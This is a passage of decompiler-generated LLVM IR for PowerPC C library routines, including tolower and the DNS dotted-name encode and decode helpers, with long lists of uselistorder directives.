  %v0_1000fadc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000fadc

dec_label_pc_1000fad8:                            ; preds = %entry
  %v3_1000fac0 = icmp eq i32 %v0_1000fab0, 0
  br i1 %v3_1000fac0, label %dec_label_pc_1000fae8, label %dec_label_pc_1000fadc

dec_label_pc_1000fadc:                            ; preds = %dec_label_pc_1000fad8, %dec_label_pc_1000fac8
  %v0_1000fadc = phi i32 [ %v0_1000fab0, %dec_label_pc_1000fad8 ], [ %v0_1000fadc.pre, %dec_label_pc_1000fac8 ]
  %tmp = icmp slt i32 %v0_1000fadc, 0
  %v1_1000fae0 = zext i1 %tmp to i32
  %v2_1000fae0 = ashr i32 %v0_1000fadc, 31
  %v3_1000fae0 = and i32 %v2_1000fae0, -2
  %v4_1000fae0 = or i32 %v3_1000fae0, %v1_1000fae0
  br label %dec_label_pc_1000faf0

dec_label_pc_1000fae8:                            ; preds = %dec_label_pc_1000fad8
  %v3_1000fae8 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000faf0

dec_label_pc_1000faf0:                            ; preds = %dec_label_pc_1000fadc, %dec_label_pc_1000fae8
  %v0_1000fb00 = phi i32 [ %v4_1000fae0, %dec_label_pc_1000fadc ], [ %v3_1000fae8, %dec_label_pc_1000fae8 ]
  store i32 %v0_1000fa84, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fb00

; uselistorder directives
  uselistorder i32 %v0_1000fadc, { 1, 0 }
  uselistorder i32 %v0_1000fab0, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 8, 9, 10, 2, 20, 3, 5, 11, 12, 7, 1, 0, 13, 14, 15, 17, 18, 16, 19, 6, 21, 4 }
  uselistorder i32 31, { 10, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 11, 12, 1, 2, 42, 43, 13, 14, 15, 7, 8, 3, 4, 0, 6, 5, 16, 17, 18, 48, 49, 46, 47, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 41, 9, 44, 45 }
  uselistorder i32 ()* @__errno_location, { 50, 41, 67, 66, 65, 40, 23, 49, 48, 39, 18, 36, 47, 46, 30, 51, 14, 13, 12, 11, 10, 25, 9, 7, 61, 60, 53, 52, 64, 63, 62, 24, 59, 22, 35, 3, 2, 45, 44, 43, 0, 38, 37, 15, 42, 17, 16, 58, 32, 31, 57, 29, 6, 20, 28, 19, 56, 55, 34, 27, 26, 54, 8, 5, 4, 1, 68, 33, 21 }
  uselistorder i32 268435456, { 5, 7, 19, 11, 4, 22, 23, 24, 25, 26, 16, 21, 6, 20, 0, 9, 10, 1, 12, 28, 17, 13, 18, 2, 8, 14, 15, 3, 27, 29, 30, 31 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000faf0, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000fb04 = add i32 %arg1, 128
  %v1_1000fb08 = mul i32 %arg1, 2
  %v2_1000fb0c = icmp ugt i32 %v1_1000fb04, 383
  %v0_1000fb10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000fb0c, i32 %v0_1000fb10)
  %v3_1000fb18 = load i32, i32* bitcast (i32** @global_var_10024a1c.598 to i32*), align 4
  %v2_1000fb1c = add i32 %v1_1000fb08, %v3_1000fb18
  %v3_1000fb1c = inttoptr i32 %v2_1000fb1c to i16*
  %v4_1000fb1c = load i16, i16* %v3_1000fb1c, align 2
  %v5_1000fb1c = sext i16 %v4_1000fb1c to i32
  ret i32 %v5_1000fb1c

; uselistorder directives
  uselistorder i32 128, { 17, 0, 1, 20, 21, 4, 5, 18, 3, 6, 7, 10, 11, 12, 13, 8, 14, 15, 16, 2, 9, 19 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000fb28 = load i32, i32* @lr, align 4
  store i32 %v0_1000fb28, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000fb34 = load i32, i32* @r4, align 4
  store i32 %v0_1000fb34, i32* @r29, align 4
  %v0_1000fb38 = load i32, i32* @r5, align 4
  store i32 %v0_1000fb38, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000fba413 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000fba413, label %dec_label_pc_1000fbc0, label %dec_label_pc_1000fbb4

dec_label_pc_1000fb48:                            ; preds = %dec_label_pc_1000fbb4
  store i32 268499788, i32* @lr, align 4
  %v3_1000fb48 = call i32 @__GI_strchr(i32 %v0_1000fbb414, i32 46)
  store i32 %v3_1000fb48, i32* @r30, align 4
  %v3_1000fb4c = icmp eq i32 %v3_1000fb48, 0
  %v0_1000fb50 = load i32, i32* @r31, align 4
  store i32 %v0_1000fb50, i32* @r3, align 4
  %v2_1000fb54 = sub i32 %v3_1000fb48, %v0_1000fb50
  store i32 %v2_1000fb54, i32* %r0.global-to-local, align 4
  br i1 %v3_1000fb4c, label %dec_label_pc_1000fb5c, label %dec_label_pc_1000fb64

dec_label_pc_1000fb5c:                            ; preds = %dec_label_pc_1000fb48
  %v0_1000fb5c = call i32 @__GI_strlen()
  store i32 %v0_1000fb5c, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000fb5c, 16777216
  %v1_1000fb60 = sdiv i32 %sext, 16777216
  store i32 %v1_1000fb60, i32* %r0.global-to-local, align 4
  %v0_1000fb74.pre = load i32, i32* @r31, align 4
  %v0_1000fb84.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fb64

dec_label_pc_1000fb64:                            ; preds = %dec_label_pc_1000fb48, %dec_label_pc_1000fb5c
  %v0_1000fb84 = phi i32 [ %v3_1000fb48, %dec_label_pc_1000fb48 ], [ %v0_1000fb84.pre, %dec_label_pc_1000fb5c ]
  %v0_1000fb74 = phi i32 [ %v0_1000fb50, %dec_label_pc_1000fb48 ], [ %v0_1000fb74.pre, %dec_label_pc_1000fb5c ]
  %v0_1000fb90 = phi i32 [ %v2_1000fb54, %dec_label_pc_1000fb48 ], [ %v1_1000fb60, %dec_label_pc_1000fb5c ]
  %v0_1000fb68 = load i32, i32* @r28, align 4
  %v1_1000fb68 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000fb68 = sub i32 %v1_1000fb68, %v0_1000fb68
  %v1_1000fb6c = add i32 %v0_1000fb68, 1
  store i32 %v1_1000fb6c, i32* %r11.global-to-local, align 4
  %v1_1000fb70 = add i32 %v2_1000fb68, -1
  store i32 %v0_1000fb74, i32* @r4, align 4
  %v0_1000fb78 = load i32, i32* @r29, align 4
  %v2_1000fb78 = add i32 %v0_1000fb78, %v1_1000fb6c
  store i32 %v2_1000fb78, i32* @r3, align 4
  store i32 %v0_1000fb90, i32* @r5, align 4
  %v2_1000fb80 = icmp ult i32 %v0_1000fb90, %v1_1000fb70
  %v1_1000fb84 = add i32 %v0_1000fb84, 1
  store i32 %v1_1000fb84, i32* @r31, align 4
  %v3_1000fb64.not = icmp ne i32 %v0_1000fb90, 0
  %or.cond = and i1 %v2_1000fb80, %v3_1000fb64.not
  br i1 %or.cond, label %dec_label_pc_1000fb90, label %dec_label_pc_1000fbd8

dec_label_pc_1000fb90:                            ; preds = %dec_label_pc_1000fb64
  %v3_1000fb90 = trunc i32 %v0_1000fb90 to i8
  %v4_1000fb90 = add i32 %v0_1000fb78, %v0_1000fb68
  %v5_1000fb90 = inttoptr i32 %v4_1000fb90 to i8*
  store i8 %v3_1000fb90, i8* %v5_1000fb90, align 1
  %v0_1000fb94 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fb94 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000fb94 = add i32 %v1_1000fb94, %v0_1000fb94
  store i32 %v2_1000fb94, i32* @r28, align 4
  store i32 268499868, i32* @lr, align 4
  %v0_1000fb98 = call i32 @memcpy()
  store i32 %v0_1000fb98, i32* %r3.global-to-local, align 4
  %v0_1000fb9c = load i32, i32* @r30, align 4
  %v3_1000fb9c = icmp eq i32 %v0_1000fb9c, 0
  br i1 %v3_1000fb9c, label %dec_label_pc_1000fbc0, label %dec_label_pc_1000fb90.dec_label_pc_1000fba4_crit_edge

dec_label_pc_1000fb90.dec_label_pc_1000fba4_crit_edge: ; preds = %dec_label_pc_1000fb90
  %v0_1000fba4.pre = load i32, i32* @r31, align 4
  %v3_1000fba4 = icmp eq i32 %v0_1000fba4.pre, 0
  store i32 %v0_1000fba4.pre, i32* @r3, align 4
  br i1 %v3_1000fba4, label %dec_label_pc_1000fbc0, label %dec_label_pc_1000fbb4

dec_label_pc_1000fbb4:                            ; preds = %entry, %dec_label_pc_1000fb90.dec_label_pc_1000fba4_crit_edge
  %v0_1000fbb414 = phi i32 [ %v0_1000fba4.pre, %dec_label_pc_1000fb90.dec_label_pc_1000fba4_crit_edge ], [ %tmp, %entry ]
  %v1_1000fbb4 = inttoptr i32 %v0_1000fbb414 to i8*
  %v2_1000fbb4 = load i8, i8* %v1_1000fbb4, align 1
  %v3_1000fbb4 = zext i8 %v2_1000fbb4 to i32
  store i32 %v3_1000fbb4, i32* %r0.global-to-local, align 4
  %v3_1000fbb8 = icmp eq i8 %v2_1000fbb4, 0
  br i1 %v3_1000fbb8, label %dec_label_pc_1000fbc0, label %dec_label_pc_1000fb48

dec_label_pc_1000fbc0:                            ; preds = %dec_label_pc_1000fb90.dec_label_pc_1000fba4_crit_edge, %dec_label_pc_1000fb90, %dec_label_pc_1000fbb4, %entry
  %v0_1000fbc0 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000fbc0, 1
  br i1 %tmp10, label %dec_label_pc_1000fbd8, label %dec_label_pc_1000fbc8

dec_label_pc_1000fbc8:                            ; preds = %dec_label_pc_1000fbc0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000fbcc = load i32, i32* @r28, align 4
  %v1_1000fbcc = add i32 %v0_1000fbcc, 1
  store i32 %v1_1000fbcc, i32* %r3.global-to-local, align 4
  %v1_1000fbd0 = load i32, i32* @r29, align 4
  %v4_1000fbd0 = add i32 %v1_1000fbd0, %v0_1000fbcc
  %v5_1000fbd0 = inttoptr i32 %v4_1000fbd0 to i8*
  store i8 0, i8* %v5_1000fbd0, align 1
  %v0_1000fbec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fbdc

dec_label_pc_1000fbd8:                            ; preds = %dec_label_pc_1000fb64, %dec_label_pc_1000fbc0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fbdc

dec_label_pc_1000fbdc:                            ; preds = %dec_label_pc_1000fbc8, %dec_label_pc_1000fbd8
  %v0_1000fbec = phi i32 [ %v0_1000fbec.pre, %dec_label_pc_1000fbc8 ], [ -1, %dec_label_pc_1000fbd8 ]
  store i32 %v0_1000fb28, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fbec

; uselistorder directives
  uselistorder i32 %v0_1000fbb414, { 1, 0 }
  uselistorder i32 %v0_1000fba4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000fb90, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000fb60, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 8, 22, 21, 2, 5, 12, 11, 10, 23, 20, 19, 18, 16, 17, 15, 14, 13, 9, 7, 0, 6, 4, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 3, 2, 0, 8, 7, 6, 5, 4, 1 }
  uselistorder i32 46, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000fbdc, { 1, 0 }
  uselistorder label %dec_label_pc_1000fbd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fbc0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000fbb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb64, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000fbf4 = call i32 @__asm_mfcr()
  store i32 %v0_1000fbf4, i32* @r26, align 4
  %v3_1000fc00 = icmp eq i32 %v0_1000fbf4, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000fc10 = load i32, i32* @r6, align 4
  store i32 %v0_1000fc10, i32* @r24, align 4
  br i1 %v3_1000fc00, label %dec_label_pc_1000fcc8, label %dec_label_pc_1000fc18

dec_label_pc_1000fc18:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000fca414 = load i32, i32* @r4, align 4
  %v2_1000fca415 = add i32 %v1_1000fca414, %v0_1000fbf4
  %v3_1000fca416 = inttoptr i32 %v2_1000fca415 to i8*
  %v4_1000fca417 = load i8, i8* %v3_1000fca416, align 1
  %v5_1000fca418 = zext i8 %v4_1000fca417 to i32
  store i32 %v5_1000fca418, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1000fcac20 = icmp eq i8 %v4_1000fca417, 0
  br i1 %v3_1000fcac20, label %dec_label_pc_1000fcb8, label %dec_label_pc_1000fc28

dec_label_pc_1000fc28:                            ; preds = %dec_label_pc_1000fc18, %dec_label_pc_1000fca0
  %v3_1000fca822 = phi i1 [ %v3_1000fca8, %dec_label_pc_1000fca0 ], [ false, %dec_label_pc_1000fc18 ]
  %v5_1000fca421 = phi i32 [ %v5_1000fca4, %dec_label_pc_1000fca0 ], [ %v5_1000fca418, %dec_label_pc_1000fc18 ]
  br i1 %v3_1000fca822, label %dec_label_pc_1000fc30, label %dec_label_pc_1000fc2c

dec_label_pc_1000fc2c:                            ; preds = %dec_label_pc_1000fc28
  %v0_1000fc2c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fc2c = add i32 %v0_1000fc2c, 1
  store i32 %v1_1000fc2c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fc30

dec_label_pc_1000fc30:                            ; preds = %dec_label_pc_1000fc28, %dec_label_pc_1000fc2c
  %v1_1000fc30 = call i32 @__asm_rlwinm(i32 %v5_1000fca421, i32 0, i32 24, i32 25)
  %v0_1000fc34 = load i32, i32* @r4, align 4
  %v1_1000fc34 = add i32 %v0_1000fc34, 1
  store i32 %v1_1000fc34, i32* @r30, align 4
  %v3_1000fc38 = icmp eq i32 %v1_1000fc30, 192
  br i1 %v3_1000fc38, label %dec_label_pc_1000fc40, label %dec_label_pc_1000fc60

dec_label_pc_1000fc40:                            ; preds = %dec_label_pc_1000fc30
  %v0_1000fc40 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000fc40, label %dec_label_pc_1000fc48, label %dec_label_pc_1000fc44

dec_label_pc_1000fc44:                            ; preds = %dec_label_pc_1000fc40
  %v0_1000fc44 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fc44 = add i32 %v0_1000fc44, 1
  store i32 %v1_1000fc44, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fc48

dec_label_pc_1000fc48:                            ; preds = %dec_label_pc_1000fc40, %dec_label_pc_1000fc44
  %v0_1000fc48 = load i32, i32* @r26, align 4
  %v2_1000fc48 = add i32 %v0_1000fc48, %v1_1000fc34
  %v3_1000fc48 = inttoptr i32 %v2_1000fc48 to i8*
  %v4_1000fc48 = load i8, i8* %v3_1000fc48, align 1
  %v5_1000fc48 = zext i8 %v4_1000fc48 to i32
  %v1_1000fc4c = call i32 @__asm_rlwinm(i32 %v5_1000fca421, i32 8, i32 18, i32 23)
  %v0_1000fc50 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000fc50, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000fc58 = or i32 %v5_1000fc48, %v1_1000fc4c
  store i32 %v2_1000fc58, i32* @r4, align 4
  br label %dec_label_pc_1000fca0

dec_label_pc_1000fc60:                            ; preds = %dec_label_pc_1000fc30
  %v0_1000fc60 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000fc60 = add i32 %v0_1000fc60, %v5_1000fca421
  store i32 %v2_1000fc60, i32* @r29, align 4
  %v1_1000fc64 = add i32 %v2_1000fc60, 1
  store i32 %v1_1000fc64, i32* @r28, align 4
  %v1_1000fc68 = load i32, i32* @r24, align 4
  %v2_1000fc68 = icmp ult i32 %v1_1000fc64, %v1_1000fc68
  br i1 %v2_1000fc68, label %dec_label_pc_1000fc70, label %dec_label_pc_1000fcc8

dec_label_pc_1000fc70:                            ; preds = %dec_label_pc_1000fc60
  %v0_1000fc70 = load i32, i32* @r26, align 4
  %v2_1000fc70 = add i32 %v0_1000fc70, %v1_1000fc34
  store i32 %v2_1000fc70, i32* @r4, align 4
  %v0_1000fc74 = load i32, i32* @r25, align 4
  %v2_1000fc74 = add i32 %v0_1000fc74, %v0_1000fc60
  store i32 %v2_1000fc74, i32* @r3, align 4
  store i32 %v5_1000fca421, i32* @r5, align 4
  store i32 268500096, i32* @lr, align 4
  %v0_1000fc7c = call i32 @memcpy()
  %v0_1000fc80 = load i32, i32* @r30, align 4
  %v2_1000fc80 = add i32 %v0_1000fc80, %v5_1000fca421
  store i32 %v2_1000fc80, i32* @r4, align 4
  %v0_1000fc84 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000fc84, label %dec_label_pc_1000fc8c, label %dec_label_pc_1000fc88

dec_label_pc_1000fc88:                            ; preds = %dec_label_pc_1000fc70
  %v0_1000fc88 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000fc88 = add i32 %v0_1000fc88, %v5_1000fca421
  store i32 %v2_1000fc88, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fc8c

dec_label_pc_1000fc8c:                            ; preds = %dec_label_pc_1000fc70, %dec_label_pc_1000fc88
  %v0_1000fc8c = load i32, i32* @r26, align 4
  %v2_1000fc8c = add i32 %v0_1000fc8c, %v2_1000fc80
  %v3_1000fc8c = inttoptr i32 %v2_1000fc8c to i8*
  %v4_1000fc8c = load i8, i8* %v3_1000fc8c, align 1
  %v3_1000fc90 = icmp eq i8 %v4_1000fc8c, 0
  br i1 %v3_1000fc90, label %dec_label_pc_1000fc9c, label %dec_label_pc_1000fc98

dec_label_pc_1000fc98:                            ; preds = %dec_label_pc_1000fc8c
  br label %dec_label_pc_1000fc9c

dec_label_pc_1000fc9c:                            ; preds = %dec_label_pc_1000fc8c, %dec_label_pc_1000fc98
  %v0_1000fc9c.off0 = phi i8 [ 0, %dec_label_pc_1000fc8c ], [ 46, %dec_label_pc_1000fc98 ]
  %v1_1000fc9c = load i32, i32* @r25, align 4
  %v2_1000fc9c = load i32, i32* @r29, align 4
  %v4_1000fc9c = add i32 %v2_1000fc9c, %v1_1000fc9c
  %v5_1000fc9c = inttoptr i32 %v4_1000fc9c to i8*
  store i8 %v0_1000fc9c.off0, i8* %v5_1000fc9c, align 1
  %v0_1000fca0.pre = load i32, i32* @r28, align 4
  %v0_1000fca8.pre.pre = load i32, i32* @r23, align 4
  %v1_1000fca4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000fca0

dec_label_pc_1000fca0:                            ; preds = %dec_label_pc_1000fc48, %dec_label_pc_1000fc9c
  %v1_1000fca4 = phi i32 [ %v2_1000fc58, %dec_label_pc_1000fc48 ], [ %v1_1000fca4.pre, %dec_label_pc_1000fc9c ]
  %v0_1000fca8.pre = phi i32 [ 0, %dec_label_pc_1000fc48 ], [ %v0_1000fca8.pre.pre, %dec_label_pc_1000fc9c ]
  %v0_1000fca0 = phi i32 [ %v0_1000fc50, %dec_label_pc_1000fc48 ], [ %v0_1000fca0.pre, %dec_label_pc_1000fc9c ]
  %v0_1000fca4.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000fca0, i32* %r11.global-to-local, align 4
  %v2_1000fca4 = add i32 %v1_1000fca4, %v0_1000fca4.pre
  %v3_1000fca4 = inttoptr i32 %v2_1000fca4 to i8*
  %v4_1000fca4 = load i8, i8* %v3_1000fca4, align 1
  %v5_1000fca4 = zext i8 %v4_1000fca4 to i32
  store i32 %v5_1000fca4, i32* @r31, align 4
  %v3_1000fca8 = icmp eq i32 %v0_1000fca8.pre, 0
  store i1 %v3_1000fca8, i1* %cr4_eq.global-to-local, align 1
  %v3_1000fcac = icmp eq i8 %v4_1000fca4, 0
  br i1 %v3_1000fcac, label %dec_label_pc_1000fcb4, label %dec_label_pc_1000fc28

dec_label_pc_1000fcb4:                            ; preds = %dec_label_pc_1000fca0
  %v0_1000fcbc.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000fca8, label %dec_label_pc_1000fcc8, label %dec_label_pc_1000fcb8

dec_label_pc_1000fcb8:                            ; preds = %dec_label_pc_1000fc18, %dec_label_pc_1000fcb4
  %v0_1000fcbc.pre26 = phi i32 [ %v0_1000fcbc.pre.pre, %dec_label_pc_1000fcb4 ], [ 0, %dec_label_pc_1000fc18 ]
  %v1_1000fcb8 = add i32 %v0_1000fcbc.pre26, 1
  store i32 %v1_1000fcb8, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fcc8

dec_label_pc_1000fcc8:                            ; preds = %dec_label_pc_1000fc60, %dec_label_pc_1000fcb4, %dec_label_pc_1000fcb8, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_1000fcb8, %dec_label_pc_1000fcb8 ], [ %v0_1000fcbc.pre.pre, %dec_label_pc_1000fcb4 ], [ -1, %dec_label_pc_1000fc60 ]
  %v1_1000fcd8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000fbf4)
  %v9_1000fcd8 = extractvalue %0 %v1_1000fcd8, 7
  store i4 %v9_1000fcd8, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000fcbc.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000fca8, { 0, 2, 1 }
  uselistorder i32 %v5_1000fca4, { 1, 0 }
  uselistorder i32 %v5_1000fca421, { 5, 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_1000fbf4, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 3, 4, 5, 2, 0, 6, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 12, 11, 10, 6, 5, 4, 3, 9, 8, 2, 21, 18, 17, 0, 19, 7, 1, 16, 15, 14, 20, 13 }
  uselistorder i32* @r5, { 41, 42, 43, 3, 44, 45, 46, 13, 57, 58, 50, 51, 11, 4, 52, 1, 53, 14, 15, 16, 17, 18, 19, 59, 20, 21, 22, 23, 24, 25, 72, 9, 10, 8, 6, 54, 55, 64, 65, 66, 12, 26, 27, 28, 73, 74, 75, 76, 67, 68, 2, 69, 70, 71, 29, 31, 30, 32, 0, 33, 34, 35, 60, 61, 47, 48, 36, 37, 38, 49, 7, 62, 63, 5, 39, 40, 56 }
  uselistorder i32* @r29, { 70, 71, 72, 73, 74, 138, 139, 1, 75, 14, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 86, 20, 21, 22, 23, 24, 2, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 40, 100, 102, 103, 119, 120, 140, 141, 42, 43, 44, 41, 125, 16, 45, 46, 3, 47, 48, 49, 50, 51, 52, 142, 143, 144, 145, 146, 147, 148, 4, 35, 124, 127, 128, 129, 130, 25, 26, 131, 5, 132, 133, 134, 135, 136, 137, 121, 122, 123, 6, 126, 7, 149, 150, 151, 53, 54, 8, 55, 56, 57, 58, 110, 111, 15, 112, 104, 105, 106, 109, 107, 17, 9, 0, 108, 59, 60, 61, 62, 63, 64, 65, 68, 10, 13, 11, 69, 19, 66, 67, 152, 153, 154, 155, 113, 114, 115, 116, 117, 12, 118, 101, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 18 }
  uselistorder i32* @r28, { 2, 76, 77, 78, 79, 80, 81, 86, 87, 82, 83, 84, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 17, 3, 16, 18, 19, 20, 21, 22, 23, 98, 102, 99, 100, 101, 1, 103, 104, 41, 42, 128, 129, 136, 137, 43, 4, 44, 45, 46, 47, 48, 5, 138, 139, 140, 141, 148, 6, 35, 36, 37, 12, 38, 24, 25, 26, 27, 28, 29, 30, 31, 32, 132, 133, 134, 135, 130, 131, 142, 143, 144, 145, 146, 49, 50, 113, 7, 114, 115, 107, 108, 109, 110, 111, 112, 51, 52, 53, 8, 54, 55, 9, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 13, 14, 15, 147, 116, 117, 118, 119, 10, 120, 11, 121, 122, 123, 124, 125, 126, 127, 74, 75, 105, 106, 33, 34, 39, 40 }
  uselistorder i32 23, { 10, 12, 13, 14, 6, 7, 8, 0, 1, 2, 5, 3, 4, 9, 11 }
  uselistorder i32 18, { 1, 0, 3, 4, 2 }
  uselistorder i32 8, { 83, 84, 85, 86, 87, 88, 18, 19, 89, 90, 91, 92, 93, 94, 24, 25, 20, 13, 14, 15, 26, 27, 28, 29, 30, 95, 96, 97, 98, 17, 46, 117, 0, 100, 47, 48, 49, 50, 51, 52, 53, 54, 10, 55, 56, 57, 129, 130, 137, 140, 8, 33, 34, 11, 31, 12, 80, 115, 32, 121, 120, 118, 119, 35, 36, 37, 122, 123, 124, 125, 126, 127, 1, 108, 109, 110, 21, 134, 135, 136, 2, 141, 3, 138, 139, 101, 102, 38, 103, 39, 58, 59, 60, 61, 62, 22, 63, 64, 65, 66, 4, 5, 67, 68, 9, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 7, 6, 131, 132, 133, 104, 105, 106, 107, 99, 40, 41, 42, 43, 44, 45, 79, 23, 81, 82, 111, 112, 113, 114, 116, 16, 128 }
  uselistorder i32* @r30, { 82, 83, 84, 8, 85, 87, 89, 90, 91, 92, 93, 86, 88, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 108, 105, 106, 5, 107, 4, 40, 41, 42, 9, 43, 44, 45, 110, 111, 112, 121, 122, 123, 124, 17, 125, 126, 127, 128, 129, 130, 131, 132, 46, 47, 48, 49, 50, 143, 144, 10, 51, 52, 53, 54, 55, 11, 153, 154, 155, 156, 12, 146, 157, 168, 158, 159, 27, 0, 79, 13, 80, 81, 147, 148, 149, 28, 29, 30, 31, 32, 150, 151, 152, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 145, 160, 161, 162, 163, 164, 165, 166, 14, 167, 56, 57, 119, 117, 118, 120, 116, 114, 113, 6, 115, 58, 59, 60, 61, 62, 2, 64, 18, 65, 15, 66, 67, 63, 68, 69, 70, 71, 72, 73, 74, 16, 75, 76, 3, 77, 78, 109, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1 false, { 1, 2, 4, 5, 6, 8, 9, 0, 11, 12, 13, 3, 10, 7, 14 }
  uselistorder i32* @r31, { 129, 2, 7, 130, 6, 131, 132, 133, 8, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 45, 50, 9, 39, 10, 11, 51, 52, 53, 148, 149, 150, 151, 1, 152, 153, 154, 155, 156, 157, 158, 159, 12, 160, 69, 70, 71, 72, 73, 161, 13, 162, 163, 164, 165, 14, 166, 167, 168, 169, 170, 171, 74, 75, 76, 77, 78, 79, 80, 81, 82, 15, 83, 16, 263, 264, 265, 17, 178, 177, 3, 179, 180, 203, 230, 231, 232, 233, 234, 65, 66, 67, 68, 181, 18, 182, 183, 19, 192, 193, 20, 194, 195, 84, 85, 86, 246, 247, 248, 87, 88, 21, 89, 90, 91, 92, 22, 93, 23, 94, 95, 96, 44, 97, 0, 266, 267, 268, 24, 46, 269, 40, 250, 25, 251, 275, 276, 42, 59, 270, 273, 274, 63, 64, 54, 55, 56, 57, 58, 127, 128, 4, 252, 253, 254, 255, 256, 257, 60, 61, 62, 258, 259, 260, 261, 262, 235, 236, 237, 27, 238, 239, 240, 26, 241, 242, 243, 244, 245, 249, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 98, 99, 196, 197, 198, 28, 199, 200, 201, 186, 187, 188, 189, 190, 29, 43, 191, 5, 184, 185, 30, 202, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 33, 32, 117, 31, 121, 122, 34, 123, 124, 125, 126, 48, 49, 119, 118, 120, 271, 35, 272, 47, 36, 41, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 216, 215, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 172, 173, 174, 175, 37, 38, 176 }
